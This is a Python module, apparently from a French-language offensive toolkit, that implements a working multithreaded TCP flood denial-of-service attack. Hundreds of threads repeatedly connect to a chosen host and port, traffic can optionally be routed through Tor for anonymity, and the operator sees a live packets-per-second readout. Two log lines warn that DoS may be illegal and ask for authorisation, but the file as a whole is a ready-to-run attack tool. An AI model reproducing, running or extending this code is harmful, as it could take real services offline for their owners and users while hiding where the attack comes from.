import socket
import threading
import time
import socks
import ipaddress
import questionary
from . import utils

# --- Global State Management for the DoS Module ---
attack_state = {
    "running": False,
    "target_ip": None,
    "port": None,
    "duration": 0,
    "start_time": 0,
    "threads": [],
    "packet_count": 0,
    "packets_per_second": 0,
    "failed_packet_count": 0,
    "failed_packets_per_second": 0,
    "lock": threading.Lock(),
    "use_tor": False
}

def _tcp_flood_worker():
    """The actual workhorse function for each thread."""
    target_ip = attack_state["target_ip"]
    target_port = attack_state["port"]
    use_tor = attack_state.get("use_tor", False)

    while attack_state["running"]:
        try:
            s = utils.create_socket(use_tor)
            s.connect((target_ip, target_port))
            s.send(b"X-a: b\r\n")
            s.close()
            with attack_state["lock"]:
                attack_state["packet_count"] += 1
        except (socket.error, ConnectionRefusedError, socks.ProxyConnectionError, socks.GeneralProxyError):
            with attack_state["lock"]:
                attack_state["failed_packet_count"] += 1
        except Exception as e:
            print(f"\n[ERREUR THREAD DOS] {e}")

def _stats_updater():
    """A dedicated thread to update the PPS (Packets Per Second) count."""
    while attack_state["running"]:
        with attack_state["lock"]:
            initial_count = attack_state["packet_count"]
            initial_failed_count = attack_state["failed_packet_count"]
        
        time.sleep(1)
        
        with attack_state["lock"]:
            current_count = attack_state["packet_count"]
            current_failed_count = attack_state["failed_packet_count"]
            attack_state["packets_per_second"] = current_count - initial_count
            attack_state["failed_packets_per_second"] = current_failed_count - initial_failed_count

def start_attack(target, port, duration, use_tor=False, num_threads=500):
    """Starts the DoS attack in the background."""
    global attack_state

    try:
        target_ip = socket.gethostbyname(target)
    except socket.gaierror:
        utils.log_message('-', f"Erreur : Impossible de résoudre le nom d'hôte {target}")
        return

    with attack_state["lock"]:
        if attack_state["running"]:
            utils.log_message('!', "Une attaque est déjà en cours.")
            return

        utils.log_message('*', f"Démarrage de l'attaque DoS sur {target}:{port}")
        attack_state["running"] = True
        attack_state["target_ip"] = target_ip
        attack_state["port"] = port
        attack_state["duration"] = duration
        attack_state["use_tor"] = use_tor
        attack_state["start_time"] = time.time()
        attack_state["packet_count"] = 0
        attack_state["packets_per_second"] = 0
        attack_state["failed_packet_count"] = 0
        attack_state["failed_packets_per_second"] = 0
        attack_state["threads"] = []

    stats_thread = threading.Thread(target=_stats_updater, daemon=True)
    stats_thread.start()
    attack_state["threads"].append(stats_thread)

    for _ in range(num_threads):
        worker = threading.Thread(target=_tcp_flood_worker, daemon=True)
        worker.start()
        attack_state["threads"].append(worker)

    stop_timer = threading.Timer(duration, stop_attack)
    stop_timer.start()

def stop_attack():
    """Stops the DoS attack."""
    global attack_state
    with attack_state["lock"]:
        if not attack_state["running"]:
            return
        utils.log_message('+', "Arrêt de l'attaque DoS.")
        attack_state["running"] = False
        attack_state["threads"] = []

def get_status():
    """Returns the current status of the attack."""
    global attack_state
    with attack_state["lock"]:
        status = {
            "running": attack_state["running"],
            "target": attack_state["target_ip"],
            "port": attack_state["port"],
            "pps": attack_state["packets_per_second"],
            "failed_pps": attack_state["failed_packets_per_second"],
            "elapsed": int(time.time() - attack_state["start_time"]) if attack_state["running"] else 0,
            "duration": attack_state["duration"]
        }
    return status

def run(target, port, duration, use_tor=False, num_threads=200):
    """Synchronous runner for the DoS attack, for CLI usage."""
    try:
        port = int(port)
        duration = int(duration)
    except ValueError:
        utils.log_message('-', "Le port et la durée doivent être des nombres entiers.")
        return

    if use_tor:
        try:
            utils.get_requests_session(force_tor=True)
        except Exception as e:
            utils.log_message('-', f"Erreur lors de l'initialisation de Tor : {e}")
            return

        try:
            if ipaddress.ip_address(target).is_private:
                utils.log_message('!', "AVERTISSEMENT : Vous essayez d'attaquer une IP privée via TOR.")
                utils.log_message('!', "TOR ne peut pas router vers des adresses locales. L'attaque échouera probablement.")
                if not questionary.confirm("Voulez-vous vraiment continuer ?").ask():
                    return
        except ValueError:
            pass

    utils.log_message('!', "AVERTISSEMENT : L'attaque par déni de service (DoS) peut être illégale.")
    utils.log_message('!', "Assurez-vous d'avoir une autorisation explicite avant de l'utiliser.")

    try:
        start_attack(target, port, duration, use_tor, num_threads)

        while get_status()["running"]:
            status = get_status()
            remaining_time = status['duration'] - status['elapsed']
            if remaining_time < 0: remaining_time = 0
            print(f'    [+] Attaque en cours sur {status["target"]}:{status["port"]} | Paquets/s: {status["pps"]} | Échecs/s: {status["failed_pps"]} | Temps restant: {remaining_time}s      ', end='\r')
            time.sleep(1)
        
        print()

    except (KeyboardInterrupt, SystemExit):
        utils.log_message('!', "Interruption détectée. Arrêt de l'attaque...")
        stop_attack()
    except Exception as e:
        utils.log_message('-', f"Une erreur est survenue: {e}")
        stop_attack()
